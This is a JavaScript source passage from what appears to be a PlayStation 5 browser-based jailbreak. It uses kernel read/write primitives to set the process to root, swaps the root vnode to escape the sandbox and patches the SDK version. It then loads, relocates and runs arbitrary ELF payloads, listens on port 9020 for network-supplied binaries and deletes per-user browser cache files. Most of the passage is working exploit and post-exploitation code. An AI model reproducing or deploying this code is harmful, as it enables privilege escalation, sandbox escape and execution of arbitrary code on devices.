        await krw.write4(restrict_flags_addr, 0);

        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
        await krw.write8(libkernel_ref_addr, new int64(1, 0));

        cur_uid = await chain.syscall(SYS_GETUID);
        await log("We root now? uid=0x" + cur_uid, LogLevel.INFO);

        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode);
        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode);

        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);

        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
            await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
        }

        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
        let jit_handle_store = p.malloc(0x4);

        let OFFSET_ELF_HEADER_ENTRY = 0x18;
        let OFFSET_ELF_HEADER_PHOFF = 0x20;
        let OFFSET_ELF_HEADER_PHNUM = 0x38;

        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

        let OFFSET_RELA_OFFSET = 0x00;
        let OFFSET_RELA_INFO = 0x08;
        let OFFSET_RELA_ADDEND = 0x10;

        let ELF_PT_LOAD = 0x01;
        let ELF_PT_DYNAMIC = 0x02;

        let ELF_DT_NULL = 0x00;
        let ELF_DT_RELA = 0x07;
        let ELF_DT_RELASZ = 0x08;
        let ELF_DT_RELAENT = 0x09;
        let ELF_R_AMD64_RELATIVE = 0x08;

        var conn_ret_store = p.malloc(0x8);

        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
        let mapping_addr = new int64(0x26100000, 0x00000009);

        let elf_program_headers_offset = 0;
        let elf_program_headers_num = 0;
        let elf_entry_point = 0;

        var parse_elf_store = async function (total_sz = -1) {

            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

            if (elf_program_headers_offset != 0x40) {
                await log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
                throw new Error("ELF header malformed, terminating connection.");
            }

            let text_segment_sz = 0;
            let data_segment_sz = 0;
            let rela_table_offset = 0;
            let rela_table_count = 0;
            let rela_table_size = 0;
            let rela_table_entsize = 0;

            let shadow_write_mapping = 0;

            for (let i = 0; i < elf_program_headers_num; i++) {
                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);

                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;

                if (program_type == ELF_PT_LOAD) {

                    if ((program_flags & 1) == 1) {

                        text_segment_sz = program_memsz;

                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                        await chain.run();
                        let exec_handle = p.read4(jit_handle_store);

                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                        await chain.run();
                        let write_handle = p.read4(jit_handle_store);

                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                        await chain.run();
                        shadow_write_mapping = p.read8(conn_ret_store);

                        let dest = p.read8(conn_ret_store);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }

                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                        await chain.run();
                    } else {

                        data_segment_sz = aligned_memsz;

                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                        await chain.run();

                        let dest = mapping_addr.add32(program_vaddr);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                    }
                }

                if (program_type == ELF_PT_DYNAMIC) {

                    for (let j = 0x00; ; j += 0x10) {
                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

                        if (d_tag == ELF_DT_NULL || j > 0x100) {
                            break;
                        }

                        switch (d_tag) {
                            case ELF_DT_RELA:
                                rela_table_offset = d_val.low;
                                break;
                            case ELF_DT_RELASZ:
                                rela_table_size = d_val.low;
                                break;
                            case ELF_DT_RELAENT:
                                rela_table_entsize = d_val.low;
                                break;
                        }
                    }
                }
            }

            if (rela_table_offset != 0) {
                let base_address = 0x1000;

                rela_table_offset += base_address;

                rela_table_count = rela_table_size / rela_table_entsize;

                for (let i = 0; i < rela_table_count; i++) {
                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_OFFSET));
                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_INFO));
                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_ADDEND));

                    let reloc_addr = mapping_addr.add32(r_offset.low);

                    if (r_offset.low <= text_segment_sz) {
                        reloc_addr = shadow_write_mapping.add32(r_offset.low);
                    }

                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
                        let reloc_value = mapping_addr.add32(r_addend.low);
                        p.write8(reloc_addr, reloc_value);
                    }
                }
            }
        }

        let rwpair_mem = p.malloc(0x8);
        let test_payload_store = p.malloc(0x8);
        let pthread_handle_store = p.malloc(0x8);
        let pthread_value_store = p.malloc(0x8);
        let args = p.malloc(0x8 * 6);

        var execute_elf_store = async function () {

            p.write8(rwpair_mem, 0);
            p.write8(rwpair_mem.add32(0x4), 0);
            p.write8(test_payload_store, 0);
            p.write8(pthread_handle_store, 0);
            p.write8(pthread_value_store, 0);
            for (let i = 0; i < 0x8 * 6; i++) {
                p.write1(args.add32(i), 0);
            }

            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
            p.write4(rwpair_mem.add32(0x04), krw.victimSock);

            p.write8(args.add32(0x00), dlsym_addr);
            p.write8(args.add32(0x08), krw.pipeMem);
            p.write8(args.add32(0x10), rwpair_mem);
            p.write8(args.add32(0x18), krw.pipeAddr);
            p.write8(args.add32(0x20), krw.kdataBase);
            p.write8(args.add32(0x28), test_payload_store);

            await log("    Executing...", LogLevel.INFO);
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));

        }

        var wait_for_elf_to_exit = async function () {

            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
            let res = p.read8(test_payload_store).low << 0;
            await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);

            return res;
        }

        var load_local_elf = async function (filename) {
            try {
                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                await parse_elf_store(total_sz);
                await execute_elf_store();
                return await wait_for_elf_to_exit();
            } catch (error) {
                await log("    Failed to load local elf: " + error, LogLevel.ERROR);
                return -1;
            }
        }

        // The shipped ELF is elfldr-ps5-1360.elf; "elfldr-ps5.elf" does not exist in
        // payloads/, so this legacy loader path could only ever have thrown "Failed to
        // fetch the binary file. Status: 404". The exploits themselves do not come through
        // here - they use poops.js's stage5 kexp handoff, which fetches
        // payloads/elfldr-ps5-1360.elf directly - so this was dead-but-broken rather than
        // fatal. Point it at the file that is actually in the zip.
        if (await load_local_elf("elfldr-ps5-1360.elf") == 0) {
            await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
            is_elfldr_running = true;
        } else {
            await log("elfldr exited with non-zero code, port 9021 will likely not work", LogLevel.ERROR);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
        if (elf_loader_socket_fd <= 0) {
            throw new Error("Failed to create ELF loader socket");
        }

        var elf_loader_sock_addr_store = p.malloc(0x10, 1);
        build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);

        let SOL_SOCKET = 0xFFFF;
        let SO_REUSEADDR = 0x0004;
        let opt_buf = p.malloc(0x4, 1);
        p.write4(opt_buf, 1);

        let setsockopt_res = (await chain.syscall(SYS_SETSOCKOPT, elf_loader_socket_fd, SOL_SOCKET, SO_REUSEADDR, opt_buf, 0x4)).low << 0;
        if (setsockopt_res < 0) {
            throw new Error("Failed to setsockopt on ELF loader socket");
        }

        let bind_res = (await chain.syscall(SYS_BIND, elf_loader_socket_fd, elf_loader_sock_addr_store, 0x10)).low << 0;
        if (bind_res < 0) {
            throw new Error("Failed to bind ELF loader socket");
        }

        let backlog = 16;
        let listen_res = (await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, backlog)).low << 0;
        if (listen_res < 0) {
            throw new Error("Failed to listen on ELF loader socket");
        }

        var conn_addr_store = p.malloc(0x10, 1);
        var conn_addr_size_store = p.malloc(0x4, 1);

        var select_readfds_size = 1024 / 8;
        var select_readfds = p.malloc(select_readfds_size, 1);

        var timeout_size = 0x10;
        var timeout = p.malloc(timeout_size);
        p.write8(timeout, 0);
        p.write8(timeout.add32(0x8), 50000);

        await log("elf loader listening on port 9020", LogLevel.INFO);
    }

    async function fstat(fd, stat_buf) {
        if (stat_buf.backing.byteLength < 0x78) {
            throw new Error("Stat buffer size too small");
        }

        let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;

        if (res < 0) {
            throw new Error("Error getting file status, res: " + res);
        }

        let st_rdev = p.read4(stat_buf.add32(20));

        let st_atim_tv_sec = p.read8(stat_buf.add32(24));
        let st_atim = new Date(st_atim_tv_sec.low * 1000 + st_atim_tv_sec.hi / 1000);

        let st_mtim_tv_sec = p.read8(stat_buf.add32(40));
        let st_mtim = new Date(st_mtim_tv_sec.low * 1000 + st_mtim_tv_sec.hi / 1000);

        let st_ctim_tv_sec = p.read8(stat_buf.add32(56));
        let st_ctim = new Date(st_ctim_tv_sec.low * 1000 + st_ctim_tv_sec.hi / 1000);

        let st_size = p.read8(stat_buf.add32(72));
        if (st_size.hi !== 0) {
            throw new Error("File size too large");
        }

        let st_blksize = p.read4(stat_buf.add32(88));

        let st_flags = p.read4(stat_buf.add32(92));

        let st_birthtim_tv_sec = p.read8(stat_buf.add32(104));
        let st_birthtim = new Date(st_birthtim_tv_sec.low * 1000 + st_birthtim_tv_sec.hi / 1000);

        return {
            st_rdev: st_rdev,
            st_atim: st_atim,
            st_mtim: st_mtim,
            st_ctim: st_ctim,
            st_size: st_size.low,
            st_blksize: st_blksize,
            fflags_t: st_flags,
            st_birthtim: st_birthtim,
        };
    }

    const DT_DIR = 4;

    async function ls(path, temp_buf) {
        if (!temp_buf.backing) {
            throw new Error("buffers backing js array not set");
        }
        let temp_buf_size = temp_buf.backing.byteLength;

        if (temp_buf_size < 0x108 || temp_buf_size < path.length + 1) {
            throw new Error("Temp buffer size too small");
        }

        if (path.endsWith("/") && path !== "/") {
            path = path.slice(0, -1);
        }

        let bufferDataView = new DataView(temp_buf.backing.buffer, temp_buf.backing.byteOffset, temp_buf_size);

        const O_DIRECTORY = 0x00020000;

        let result = [];

        p.writestr(temp_buf, path);

        let dir_fd = (await chain.syscall(SYS_OPEN, temp_buf, O_DIRECTORY)).low << 0;
        if (dir_fd < 0) {
            throw new Error(`Error opening directory '${path}' (not found, or not a directory)`);
        }

        try {

            let stat = await fstat(dir_fd, temp_buf);

            let block_size = stat.st_blksize;

            if (block_size <= 0) {
                throw new Error("Invalid block size");
            }

            if (temp_buf_size < block_size) {
                throw new Error("Dirent buffer size too small, it has to be at least the fs block size which is " + block_size);
            }

            let total_bytes_read = 0;
            let total_files = 0;

            while (true) {

                let bytes_read = (await chain.syscall(SYS_GETDIRENTRIES, dir_fd, temp_buf, temp_buf_size, 0)).low << 0;

                if (bytes_read < 0) {
                    throw new Error("Error reading directory");
                }

                if (bytes_read == 0) {
                    break;
                }

                let offset = 0;
                let loops = 0;
                while (offset < bytes_read) {
                    loops++;

                    let d_fileno = bufferDataView.getUint32(offset, true);
                    let d_reclen = bufferDataView.getUint16(offset + 4, true);
                    let d_type = bufferDataView.getUint8(offset + 6);
                    let d_namlen = bufferDataView.getUint8(offset + 7);
                    let d_name = "";
                    for (let i = 0; i < d_namlen; i++) {
                        d_name += String.fromCharCode(bufferDataView.getUint8(offset + 8 + i));
                    }

                    result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });

                    offset += d_reclen;
                    total_files++;
                }

                total_bytes_read += bytes_read;
            }

            return result;
        } finally {
            await chain.syscall(SYS_CLOSE, dir_fd);

            if (temp_buf.backing) {
                temp_buf.backing.fill(0);
            }
        }
    }

    async function delete_appcache(log = () => { }) {
        let user_home_entries = await ls("/user/home", elf_store);

        let user_ids = user_home_entries.reduce((acc, dirent) => {
            if (dirent.d_type === DT_DIR && dirent.d_name !== "." && dirent.d_name !== "..") {
                let user_id = dirent.d_name;
                acc.push(user_id);
            }
            return acc;
        }, []);

        if (user_ids.length === 0) {
            throw new Error("No users found");
        }

        async function unlink(path) {
            p.writestr(elf_store, path);
            return await chain.syscall_int32(SYS_UNLINK, elf_store);
        }

        for (let user_id of user_ids) {
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`);
            await log(`Deleted appcache files for user with id '${user_id}'`);
        }

        if (user_ids.length > 1) {
            await log(`Deleted appcache files for all ${user_ids.length} users`);
        }
    }

    async function send_buffer_to_port(buffer, size, port) {
        let sock = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (sock <= 0) {
            throw new Error("Failed to create socket");
        }

        build_addr(p, send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);

        let connect_res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_to_port.sock_addr_store, 0x10)).low << 0;
        if (connect_res < 0) {
            await chain.syscall(SYS_CLOSE, sock);
            throw new Error("Failed to connect to port " + port);
        }

        let bytes_sent = 0;
        let write_ptr = buffer.add32(0x0);
        while (bytes_sent < size) {
            let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, size - bytes_sent)).low << 0;
            if (send_res <= 0) {
                await chain.syscall(SYS_CLOSE, sock);
                throw new Error("Failed to send buffer to port " + port);
            }

            bytes_sent += send_res;
            write_ptr.add32inplace(send_res);
        }

        await chain.syscall(SYS_CLOSE, sock);
    }
    send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);

    sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

    let ports = wkOnly ? "" : "9020";
    if (is_elfldr_running) {
        if (ports) {
            ports += ", ";
        }
        ports += "9021";
    }

    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;

    let queue = [];

    window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {

        let payload_info = event.detail;
        let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
        queue.push({ payload_info, toast });
    });

    await new Promise(resolve => setTimeout(resolve, 300));
    await switchPage("payloads-view");

    while (true) {

        if (queue.length > 0) {

            let { payload_info, toast } =  (queue.shift());

            try {
                if (payload_info.customAction) {
                    if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
                        await delete_appcache(updateToastMessage.bind(null, toast));
                    } else {
                        throw new Error(`Unknown custom action: ${payload_info.customAction}`);
                    }
                } else {
                    updateToastMessage(toast, `${payload_info.displayTitle}: Fetching...`);
                    let total_sz = await load_payload_into_elf_store_from_local_file(payload_info.fileName);

                    if (!payload_info.toPort) {
                        if (wkOnly) {
                            throw new Error();
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
                        await parse_elf_store(total_sz);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload running...`);
                        await execute_elf_store();
                        let out = await wait_for_elf_to_exit();

                        if (out !== 0) {
                            throw new Error('Payload exited with non-zero code: 0x' + out.toString(16));
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload exited with success code`);
                    } else {
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`);
                        await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`);
                    }
                }

            } catch (error) {
                updateToastMessage(toast, `${payload_info.displayTitle}: Error: ${error}`);
                setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
                continue;
            }

            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        }

        if (queue.length > 0) {
            continue;
        }

        if (wkOnly) {
            await new Promise(resolve => setTimeout(resolve, 50));
            continue;
        }

        select_readfds.backing.fill(0);
        select_readfds.backing[elf_loader_socket_fd >> 3] |= 1 << (elf_loader_socket_fd & 7);
        let select_res = (await chain.syscall(SYS_SELECT, elf_loader_socket_fd + 1, select_readfds, 0, 0, timeout)).low << 0;
        if (select_res < 0) {
            throw new Error("Select failed");
        } else if (select_res === 0) {
            continue;
        }

        let conn_fd = (await chain.syscall(SYS_ACCEPT, elf_loader_socket_fd, conn_addr_store, conn_addr_size_store)).low << 0;
        if (conn_fd < 0) {
            throw new Error("Failed to accept connection");
        }

        let toast = showToast("ELF Loader: Got a connection, reading...", -1);
        try {

            let write_ptr = elf_store.add32(0x0);
            let total_sz = 0;
            while (total_sz < elf_store_size) {
                let read_res = (await chain.syscall(SYS_READ, conn_fd, write_ptr, elf_store_size - total_sz)).low << 0;
                if (read_res <= 0) {
                    break;
                }

                write_ptr.add32inplace(read_res);
                total_sz += read_res;
            }

            updateToastMessage(toast, "ELF Loader: Parsing ELF...");
            await parse_elf_store(total_sz);

            updateToastMessage(toast, "ELF Loader: Executing ELF...");
            await execute_elf_store();

            let out = await wait_for_elf_to_exit();
            if (out !== 0) {
                throw new Error('ELF Loader exited with non-zero code: 0x' + out.toString(16));
            }

            updateToastMessage(toast, "ELF Loader: Payload exited with success code");
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        } catch (error) {
            updateToastMessage(toast, `ELF Loader: Error: ${error}`);
            setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        } finally {
            await chain.syscall(SYS_CLOSE, conn_fd);
        }

    }

}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);

fwScript.setAttribute('src', `offsets/${window.fw_str}.js?v=132`);
